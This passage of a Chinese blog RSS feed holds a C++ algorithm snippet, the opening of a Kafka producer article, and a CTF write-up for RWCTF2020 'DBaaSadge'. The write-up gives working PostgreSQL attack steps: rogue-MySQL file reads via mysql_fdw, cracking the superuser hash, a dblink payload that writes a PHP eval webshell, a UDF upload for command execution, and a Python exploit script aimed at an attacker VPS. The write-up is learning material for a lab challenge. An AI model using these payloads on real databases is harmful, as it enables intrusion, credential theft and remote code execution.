        for(rg int i=1;i&amp;lt;=n;i++) hig[i]=std::lower_bound(sta+1,sta+1+tp,hig[i])-sta;
        cnt=n;
        rg int aa,bb,cc;
        for(rg int i=1;i&amp;lt;=m;i++){
                aa=read(),bb=read(),cc=read();
                jl[i]=Node(aa,bb,cc);
        }
        std::sort(jl+1,jl+1+m,cmp);
        for(rg int i=1;i&amp;lt;=n+n;i++) fa[i]=i;
        for(rg int i=1;i&amp;lt;=m;i++){
                aa=jl[i].zb,bb=jl[i].yb,cc=jl[i].val;
                aa=zhao(aa),bb=zhao(bb);
                if(aa==bb) continue;
                val[++cnt]=cc;
                fa[aa]=cnt,fa[bb]=cnt;
                ad(aa,cnt),ad(cnt,aa);
                ad(bb,cnt),ad(cnt,bb);
        }
        for(rg int i=1;i&amp;lt;=cnt;i++){
                if(fa[i]==i){
                        dfs(i,0);
                }
        }
        for(rg int i=1;i&amp;lt;=cnt;i++){
                rt[i]=rt[i-1];
                if(rk[i]&amp;lt;=n){
                        rt[i]=ad(rt[i],rt[i],1,tp,hig[rk[i]]);
                }
        }
        for(rg int i=1;i&amp;lt;=q;i++){
                aa=read(),bb=read(),cc=read();
                printf(&quot;%d\n&quot;,solve(aa,bb,cc));
        }
        return 0;
}
&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Tue, 19 Jan 2021 23:34:00 +0000</pubDate>
<dc:creator>liuchanglc</dc:creator>
<og:description>kruskal重构树学习笔记</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/liuchanglc/p/14301009.html</dc:identifier>
</item>
<item>
<title>RWCTF2020 DBaaSadge 复现 - print(Dem0)</title>
<link>http://www.cnblogs.com/dem0/p/14300743.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/dem0/p/14300743.html</guid>
<description>&lt;h2 id=&quot;数据库题目&quot;&gt;数据库题目&lt;/h2&gt;
&lt;h2 id=&quot;2020rwctf-dbaasadge-wp&quot;&gt;2020RWCTF DBaaSadge WP&lt;/h2&gt;
&lt;p&gt;这是一个很有意思的题目，难到让我绝望，跟着大佬smity的思路跑一下，求大佬抱抱。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/jvA5j9OPMFIPvP5267gk-Q&quot; target=&quot;_blank&quot;&gt;https://mp.weixin.qq.com/s/jvA5j9OPMFIPvP5267gk-Q&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x01-题目&quot;&gt;0x01 题目&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/sZoInh3cgBUSRtQ.png&quot; alt=&quot;image-20210119083302921&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;一打开就是题目的代码直接执行，可以直接执行pg的代码，但是长度不能超过100.（本身是给了dockerfile）先进行必要的信息收集。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;select version();
select user;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/LVeUGEuAcfbKkCO.png&quot; alt=&quot;image-20210119083506773&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/82Kg5QXTcLZNejC.png&quot; alt=&quot;image-20210119083528541&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后大佬说这不是10.5之前修复的那个CVE漏洞，而且那是一道pwn题，这是一个web题。然后想到的就是怎么样可以通过psql的数据库语句来进行命令执行，但是这里的用户是realuser，不是superuser用户，所以网上大部分的方法是不能够使用的。&lt;/p&gt;
&lt;p&gt;所以到现在想到的就是，提权加上getshell，来达到命令执行的效果。&lt;/p&gt;
&lt;h4 id=&quot;0x02-dockfile分析&quot;&gt;0x02 dockfile分析&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/Vg4oTh9tnHDvZXs.png&quot; alt=&quot;image-20210119084014713&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其中被圈出来的是和psql有关的操作。比如说，&lt;code&gt;psql -c &quot;command&quot;&lt;/code&gt;这是命令行模式直接执行psql语句的用法。咱们再来细细的分析这个dockerfile。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/7gXnhEYMy43T69P.png&quot; alt=&quot;image-20210119084954006&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1. 创建了一个没有super权限的realuser 密码是 realpass
2. 安装了dblink mysql_fdw的两个扩展
3. dblink，能够在一个数据库中操作另外一个远程的数据库。
mysql_fdw扩展则是用来在Postgre中快速访问MySQL中的数据，也就是给Postgre提供一个外界Mysql的访问方式
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里大佬想到了 &lt;code&gt;rouge-mysql&lt;/code&gt;，而我就是个菜鸡，数据库题目一个都不会。（这个考点在CTF中比较常见，通过让题目连接自己的mysql恶意服务器来进行任意文件读取（我怎么就没想到）&lt;/p&gt;
&lt;p&gt;msql_fdw插件的使用：&lt;a href=&quot;https://blog.csdn.net/bingluo8787/article/details/100958098&quot; target=&quot;_blank&quot;&gt;https://blog.csdn.net/bingluo8787/article/details/100958098&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可以知道和直接使用mysql没有什么区别（嘻嘻&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;CREATE SERVER mysql_server FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host'ip',port'3306');
#创建一个server
CREATE USER MAPPING FOR realuser SERVER mysql_server OPTIONS (username 'root', password 'root');
#创建链接用户名
CREATE FOREIGN TABLE test(id int) SERVER mysql_server OPTIONS (dbname 'a', table_name 'test');

select * from test;

DROP SERVER mysql_server
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样我们在vps上面挂个脚本就可以了。&lt;a href=&quot;https://github.com/allyshka/Rogue-MySql-Server&quot; target=&quot;_blank&quot;&gt;https://github.com/allyshka/Rogue-MySql-Server&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这样就可以任意文件读取，但是有个问题，这有什么用了....dokcer都给了。下面就是继续提权了白。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;下面给出3个方法&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1.寻找conf文件配置中的漏洞，看能不能免密码登录superuser的账户，在UNIX平台中安装PostgreSQL之后，PostgreSQL会在UNIX系统中创建一个名为&quot;postgres&quot;当用户。PostgreSQL的默认用户名和数据库也是&quot;postgres&quot;，而且这个是个superuser
2.在pg_hba.conf中如果把host配置为trust是可以进行免密登录的
3.类比mysql ，在本地寻找密码存储的文件。通过vps来读。
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后我们一个一个来验证。&lt;/p&gt;
&lt;p&gt;首先，我们来寻找这个神奇的conf文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/M5mCXuwtehNU9gv.png&quot; alt=&quot;image-20210119094634992&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;难道要成功了吗？（忘记看启动文件了。。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/LME4QDKVcTdRmHY.png&quot; alt=&quot;image-20210119101128474&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再见谢谢。每次docker重启就是刷新一个&lt;strong&gt;五位数的随机密码&lt;/strong&gt;（记住，重点）。&lt;/p&gt;
&lt;p&gt;验证第二条思路：&lt;/p&gt;
&lt;p&gt;读取上面那个文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/DIua4Wtv8d2cTyY.png&quot; alt=&quot;image-20210119101355309&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/HNvAyg6fWPLMGhm.png&quot; alt=&quot;image-20210119101706467&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;很明显是不能够登陆了。然后，五位数密码爆破，去死把。&lt;/p&gt;
&lt;p&gt;最后一个思路：&lt;/p&gt;
&lt;p&gt;既然能够读取，百度查psql的密码文件落户到本地的哪个位置，在哪个目录，我们直接读取之。&lt;/p&gt;
&lt;p&gt;mysql里面的密码存储方式是落地的，就在&lt;strong&gt;data_directory&lt;/strong&gt;变量的目录位置，那么同样的，进到docker里面通过查询一下系统变量，就可以看到postgre的密码存放位置。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/O9Sor568TUNuLwd.png&quot; alt=&quot;image-20210119102418358&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/cOgaQJ6xLbCvr9M.png&quot; alt=&quot;image-20210119102439503&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后用文件内容查找的命令&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;egrep -r &quot;内容&quot; 目录
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/5SvPxCYNpjyTzBO.png&quot; alt=&quot;image-20210119102611994&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后使用md5在线解密或者爆破脚本使用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/4PYxAmFUycz8Mjo.png&quot; alt=&quot;image-20210119102823562&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里面有历史密码。&lt;/p&gt;
&lt;p&gt;md5爆破工具&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;http://c3rb3r.openwall.net/mdcrack
使用方法
http://www.91ri.org/1285.html
MDCrack-sse.exe   -algorithm=MD5 --append=postgres 8997a9f1da6bbfbc2aaad2cb295a1b0b
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/OXnZC21q7B9KryT.png&quot; alt=&quot;image-20210119104154604&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;拿到我想要的账号和密码，现在就是和上面的dblink联合在一起，来登陆这个超级用户&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;6k35mpostgres
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;select dblink_connect('host=127.0.0.1 port=5432 dbname=postgres user=postgres password=6k35m');
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/pkcwbPIxu5U8OaH.png&quot; alt=&quot;image-20210119110419536&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;成功登陆。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;SELECT * FROM dblink('hostaddr=127.0.0.1 user=postgres password=aaaaa', 'COPY (select $$&amp;lt;?=@eval($_REQUEST[1]);?&amp;gt;$$) to $$/var/www/html/1.php$$;') as t1(record text);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下面就是如何将上面这句长长的payload打进去了，有长度限制。。。。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;如果是敏感字符的考察 ，可以用postgre的存储过程。
create OR REPLACE FUNCTION D(a INTEGER, b INTEGER) RETURNS INTEGER AS $$ SELECT a+b; $$ LANGUAGE SQL;
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;但是存储过程在命令行中是可以分开写的，就算是两次连接一样可以写完，但是url里面他的回车符传入到postgre后端不识别，因此他不能分开写，所以还是绕不过去100个字符的限制。因此这个方法不通。
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;正解：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过子查询，将poc语句写到自己的mysql服务器，利用mysql_fdw扩展连接mysql服务器select出来。&lt;/p&gt;
&lt;p&gt;postgre的常用命令&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;\c - realuser 切换用户到realuser
DROP FOREIGN TABLE a66; 丢掉外部表a66
DROP USER MAPPING FOR realuser SERVER a66_server; 去掉用户关系 对于realuser server a66
DROP SERVER a66_server;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个地方一定一定不能因为想弄长一点，就用longtext或者其他text类型来声明这两个字段，因为当postgre从mysql查询的时候会报如下错误：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;poc1=&quot;CREATE SERVER a66_server FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host'IP',port'3306');&quot;
poc2=&quot;CREATE USER MAPPING FOR realuser SERVER a66_server OPTIONS (username 'root', password 'root');&quot;
poc3=&quot;CREATE FOREIGN TABLE a66(s text,m text) SERVER a66_server OPTIONS (dbname 'b', table_name 'b');&quot;
poc4=&quot;SELECT * FROM dblink((select s from a66), (select m from a66)) as t9(record text);&quot;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;现在文件已经写完了，但是我们没有什么权限&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/nZFx7NPiqGEBQ6w.png&quot; alt=&quot;image-20210119152105664&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;开始打UDF，学习https://blog.csdn.net/qq_33020901/article/details/79032774&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;https://github.com/sqlmapproject/udfhack
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这是sqlmap上面的udf插件。&lt;/p&gt;
&lt;p&gt;linux换源：&lt;a href=&quot;https://blog.csdn.net/u012308586/article/details/102953882&quot; target=&quot;_blank&quot;&gt;https://blog.csdn.net/u012308586/article/details/102953882&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/4eW1t8ZUYiA6Efb.png&quot; alt=&quot;image-20210119155144324&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在makefile里面添加一行。执行&lt;code&gt;make 10&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;编译完成之后&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/T7ZGcUq6JiyYDl2.png&quot; alt=&quot;image-20210119155458492&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接下来我们需要将udf.so文件分割成每2048字节的块,最后一个块的大小不满足2048字节不需要考虑.&lt;br/&gt;为什么不能小于2048?是因为在postgresql高版本处理中,&lt;strong&gt;如果块之间小于2048,默认会用0去填充让块达到2048字节所以上传的文件才会一直创建函数失败&lt;/strong&gt;.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;#~/usr/bin/env python 2.7
#-*- coding:utf-8 -*-
import sys

if __name__ == &quot;__main__&quot;:
    if len(sys.argv) != 2:
        print &quot;Usage:python &quot; + sys.argv[0] + &quot;inputfile&quot;
        sys.exit()
    fileobj = open(sys.argv[1],'rb')
    i = 0
    for b in fileobj.read():
        sys.stdout.write(r'{:02x}'.format(ord(b)))
        i = i + 1
        if i % 2048 == 0:
            print &quot;\n&quot;
    fileobj.close()
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;SELECT lo_create(12345);
INSERT INTO pg_largeobject VALUES (12345, 0, decode('7f454c4...0000', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 1, decode('0000000...0000', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 2, decode('f604000...0000', 'hex'));
INSERT INTO pg_largeobject VALUES (12345, 3, decode('0000000...7400', 'hex'));
SELECT lo_export(12345, '/tmp/testeval.so');
SELECT lo_unlink(12345);
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;insert into b (s,m) value('hostaddr=127.0.0.1 user=postgres password=25j53',&quot;CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/testeval.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;select sys_eval('/readflag');&quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在将hex数据插入之后，运行一次poc，然后再将下面这个插入，再运行一次命令即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/01/19/IE8Crz3J5O6iDmA.png&quot; alt=&quot;image-20210119171938650&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面脚本的使用条件：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;vps上面开启mysql服务3306端口 账号admin 密码123456
有数据库b b里有
表a 里面 s字段是 存储链接ps数据库super的host和端口和账号和密码
m字段是 命令执行readflag
表b 里面 s字段同上
m字段是 so文件的加载

听说命令执行有更好的方式不使用udf;
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;import requests
import hashlib
import random
import uuid
url =&quot;http://192.168.72.89:60080/?sql=&quot;

#填你的IP
ip=&quot;42.192.142.64&quot;
port=&quot;3306&quot;
server_name=&quot;aaaa&quot;
dbname=server_name
Table_name=server_name
'''
任意文件的poc
poc1=&quot;CREATE SERVER &quot;+server_name+&quot; FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host'&quot;+ip+&quot;',port'&quot;+port+&quot;');&quot;
poc2里填写你自己mysql的用户名密码
poc2=&quot;CREATE USER MAPPING FOR realuser SERVER &quot;+server_name+&quot; OPTIONS (username 'root', password 'root');&quot;
poc3=&quot;CREATE FOREIGN TABLE &quot;+Table_name+&quot;(id int) SERVER &quot;+server_name+&quot; OPTIONS (dbname '&quot;+dbname+&quot;', table_name '&quot;+Table_name+&quot;');&quot;
poc4=&quot;select * from &quot;+Table_name+&quot;;&quot;
poc5=&quot;DROP SERVER &quot;+server_name
'''

'''

#插入数据
poc1=&quot;CREATE SERVER a66_server FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host'ip  ',port'3306');&quot;
poc2=&quot;CREATE USER MAPPING FOR realuser SERVER a66_server OPTIONS (username 'admin', password '123456');&quot;
poc3=&quot;CREATE FOREIGN TABLE a66(s text,m text) SERVER a66_server OPTIONS (dbname 'b', table_name 'b');&quot;
poc4=&quot;SELECT * FROM dblink((select s from a66), (select m from a66)) as t9(record text);&quot;
#poc4 = &quot;select dblink_connect((select s from a66),(select m from a66));&quot;
poc5=&quot;DROP FOREIGN TABLE a66;&quot;
poc6=&quot;DROP USER MAPPING FOR realuser SERVER a66_server;&quot;
poc7 = &quot;DROP SERVER a66_server;&quot;
'''
poc1=&quot;CREATE SERVER a66_server FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host'42.192.142.64  ',port'3306');&quot;
poc2=&quot;CREATE USER MAPPING FOR realuser SERVER a66_server OPTIONS (username 'admin', password 'q79475432');&quot;
poc3=&quot;CREATE FOREIGN TABLE a66(s text,m text) SERVER a66_server OPTIONS (dbname 'b', table_name 'b');&quot;
poc8=&quot;CREATE FOREIGN TABLE a67(s text,m text) SERVER a66_server OPTIONS (dbname 'b', table_name 'a');&quot;
poc9=&quot;SELECT * FROM dblink((select s from a67), (select m from a67)) as t10(record text);&quot;
poc4=&quot;SELECT * FROM dblink((select s from a66), (select m from a66)) as t9(record text);&quot;

poc5=&quot;DROP FOREIGN TABLE a66;DROP FOREIGN TABLE a67;&quot;
poc6=&quot;DROP USER MAPPING FOR realuser SERVER a66_server;&quot;
poc7=&quot;DROP SERVER a66_server;&quot;
r1=requests.get(url+poc1)
print(r1.text)
r2=requests.get(url+poc2)
print(r2.text)
r3=requests.get(url+poc3)
print(r3.text)
r4=requests.get(url+poc4)
print(r4.text)
r8=requests.get(url+poc8)
print(r8.text)
r9=requests.get(url+poc9)
print(r9.text)

r5=requests.get(url+poc5)
print(r5.text)
r6=requests.get(url+poc6)
print(r6.text)
r7=requests.get(url+poc7)
print(r7.text)

&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Tue, 19 Jan 2021 15:54:00 +0000</pubDate>
<dc:creator>print(Dem0)</dc:creator>
<og:description>数据库题目 2020RWCTF DBaaSadge WP 这是一个很有意思的题目，难到让我绝望，跟着大佬smity的思路跑一下，求大佬抱抱。 https://mp.weixin.qq.com/s/jv</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/dem0/p/14300743.html</dc:identifier>
</item>
<item>
<title>Kafka 探险 -  生产者源码分析: 核心组件 - 徐笔笔</title>
<link>http://www.cnblogs.com/lwen/p/14300608.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lwen/p/14300608.html</guid>
<description>&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p data-lake-id=&quot;76adee2b82e4a18d6a39fb7c772e9fc9&quot;&gt;这个 Kafka 的专题，我会从系统整体架构，设计到代码落地。和大家一起杠源码，学技巧，涨知识。希望大家持续关注一起见证成长！&lt;/p&gt;
&lt;p data-lake-id=&quot;ecf9c8c0284fa4e59ff2250b06d2f8d5&quot;&gt;&lt;strong&gt;我相信：技术的道路，十年如一日！十年磨一剑！&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p data-lake-id=&quot;745ac0d1a0aed5880b61c5562e8f1ccb&quot;&gt; &lt;/p&gt;
&lt;h2 id=&quot;PInIo&quot; data-lake-id=&quot;6f21946101bd61ad85145727cf46c431&quot;&gt;往期文章&lt;/h2&gt;
&lt;p data-lake-id=&quot;4437d77f3112cb36d69e20106b9a86f9&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;f33e15a49d1b08abbd9725e12bc100db&quot;&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/MBvXz5OJypUtJy3BqkRJ1w&quot; target=&quot;_blank&quot;&gt;Kafka 探险 - 架构简介&lt;/a&gt;&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;434d3942124774c9939ce163e6422421&quot;&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/Vu7EZJl529UVNGOrRZa4jQ&quot; target=&quot;_blank&quot;&gt;Kafka 探险 - 源码环境搭建&lt;/a&gt;&lt;/p&gt;
&lt;p data-lake-id=&quot;c3b6ce7d2d9fd95df2dd846cde7f8f9e&quot;&gt; &lt;/p&gt;
&lt;h2 id=&quot;ShTDo&quot; data-lake-id=&quot;b909fb58f31997bfea5478c499be267b&quot;&gt;前言&lt;/h2&gt;
&lt;p data-lake-id=&quot;be808b2e463128a5d0e8ad049ab57a07&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;a4055680f1f4c121d8669cd035fc47fc&quot;&gt;我们说 Kafka 是一个消息队列，其实更加确切的说：是 Broker 这个核心部件。为何这么说？你会发现我们可以通过控制台、 Java 代码、 C++ 代码、甚至是 Socket 向 Broker 写入消息，只要我们遵从了 Kafka 写入消息的协议，就可以将消息发送到 Kafka 队列中。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;3d6d886f22eff3a4e5c3dc91614b17ea&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;8e717bb5ff39184df2ca3dad790e59e7&quot;&gt;用专业一点的话术来说，Kafka 定义了一个应用层的网络协议，只要我们基于传输层构造出符合这个协议的数据，就是合法的 Kafka 消息。&lt;span class=&quot;lake-card-margin-top lake-card-margin-bottom lake-selected&quot; data-card-type=&quot;inline&quot; data-lake-card=&quot;image&quot; data-card-value=&quot;data:%7B%22src%22%3A%22https%3A%2F%2Fcdn.nlark.com%2Fyuque%2F0%2F2021%2Fpng%2F171275%2F1610854581291-8134c371-cf23-48d4-a48d-be40b19de139.png%22%2C%22originWidth%22%3A1920%2C%22originHeight%22%3A1080%2C%22name%22%3A%22image.png%22%2C%22size%22%3A281355%2C%22display%22%3A%22inline%22%2C%22align%22%3A%22left%22%2C%22linkTarget%22%3A%22_blank%22%2C%22status%22%3A%22done%22%2C%22ocrLocations%22%3A%5B%7B%22x%22%3A373.50046%2C%22y%22%3A262.22577%2C%22width%22%3A174.20999000000006%2C%22height%22%3A29.990229999999997%2C%22text%22%3A%22JavaProducer%22%7D%2C%7B%22x%22%3A1346.8406%2C%22y%22%3A414.28574%2C%22width%22%3A112.40290000000005%2C%22height%22%3A33.82388000000003%2C%22text%22%3A%22Broker%22%7D%2C%7B%22x%22%3A1000.9422%2C%22y%22%3A435.37033%2C%22width%22%3A175.31680000000006%2C%22height%22%3A34.42904999999996%2C%22text%22%3A%22msgProtocol%22%7D%2C%7B%22x%22%3A372.95627%2C%22y%22%3A452.45132%2C%22width%22%3A174.04476999999997%2C%22height%22%3A26.167329999999993%2C%22text%22%3A%22c%2B%2BProducer%22%7D%2C%7B%22x%22%3A815.04877%2C%22y%22%3A527.6074%2C%22width%22%3A178.67102999999997%2C%22height%22%3A25.92680000000007%2C%22text%22%3A%22inPlement%22%7D%2C%7B%22x%22%3A364.34558%2C%22y%22%3A614.1824%2C%22width%22%3A204.36992000000004%2C%22height%22%3A38.55813999999998%2C%22text%22%3A%22PythonProducer%22%7D%2C%7B%22x%22%3A374.32007%2C%22y%22%3A779.4053%2C%22width%22%3A182.90683%2C%22height%22%3A24.75909999999999%2C%22text%22%3A%22ScalaProducex%22%7D%5D%2C%22style%22%3A%22none%22%2C%22search%22%3A%22JavaProducer%20Broker%20msgProtocol%20c%2B%2BProducer%20inPlement%20PythonProducer%20ScalaProducex%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22width%22%3A960%2C%22height%22%3A540%7D&quot;&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/png/171275/1610854581291-8134c371-cf23-48d4-a48d-be40b19de139.png?x-oss-process=image%2Fresize%2Cw_1500&quot; alt=&quot;image.png&quot; class=&quot;image lake-drag-image&quot; title=&quot;image.png&quot; data-role=&quot;image&quot; data-raw-src=&quot;&quot; data-height=&quot;540px&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;6b354faf0b61598f2dd83b63e20e035d&quot;&gt;所以说我们写入 Kafka 消息的只是一个生产者的客户端，他的形式多种多样，有 Java ，Python，C++ 等多种实现，那么我们每次发消息难道还需要自己去实现这套发送消息的协议么？显然 Kafka 官方已经考虑到这个问题了，为了给我们提供 &lt;code&gt;开箱即用&lt;/code&gt; 的消息队列，官方已经帮我们写好了各种语言的优质生产者实现，例如我们今天要讨论的 Java 版本的实现。&lt;/p&gt;
&lt;p data-lake-id=&quot;65fd5cebe8454848af46c1534c6fc8c0&quot;&gt; &lt;/p&gt;
&lt;h2 id=&quot;7fliC&quot; data-lake-id=&quot;4f6c09576cf4419d35f4baecbad853d7&quot;&gt;思考&lt;/h2&gt;
&lt;p data-lake-id=&quot;26e8cacd1d34fc84d26baa324c26964e&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;86ef1645b4f3168c1e576849116b5c49&quot;&gt;前面提到 Kafka 帮我们实现了各个版本的生产者代码，其实他也可以完全不提供这份代码，因为核心的队列的功能已经实现了，这些客户端的代码也可以完全交由用户自己实现。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;2ab819bc0945e9fef1635892de23070b&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;9cbc5b8f6e42eecb2b70123f4c468f9f&quot;&gt;那么假如没有官方代码，我们又该实现一些什么功能，有哪些接口，哪些方法，以及如何组织这些代码呢。带着这样的问题我们一起来思考一下！一般对于这种带有数据流转的设计，我会从 &lt;code&gt;由谁产生？&lt;/code&gt; &lt;code&gt;什么数据？&lt;/code&gt;    &lt;code&gt;通往哪去？&lt;/code&gt;  &lt;code&gt;如何保证通路可靠？&lt;/code&gt; 这几个方面来考虑。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;3873d3d041bf697bbc62530c22f4c56a&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;045ba7321e2b4277e04241bea8214fa8&quot;&gt;消息自然是通过应用程序构造出来并提供给生产者，生产者首先要知道需要将消息发送到哪个 Broker 的哪个 Topic，以及 Topic 的具体 Partition 。那么必然需要配置客户端的 &lt;code&gt;Broker集群地址&lt;/code&gt; ，需要发送的 &lt;code&gt;Topic 名称&lt;/code&gt; ，以及 &lt;code&gt;消息的分区策略&lt;/code&gt; ，是指定到具体的分区还是通过某个 key hash 到不同的分区。&lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;ef524e2579991b1cacff3f9fd061c05e&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;lake-lineheight-25&quot; data-lake-id=&quot;1ad28b6025690231d65f0e9c99fa7b4e&quot;&gt;知道了消息要通往哪，还需要知道发送的是什么格式的消息，是字符串还是数字或是被序列化的二进制对象。 &lt;code&gt;消息序列化&lt;/code&gt;  将需要消息序列化成字节数组才方便在网络上传输，所以要配置生产者的消息序列化策略，最好是可以通过传递枚举或者类名的方式自动构造序列化器，便于后续序列化过程的扩展。&lt;/p&gt;
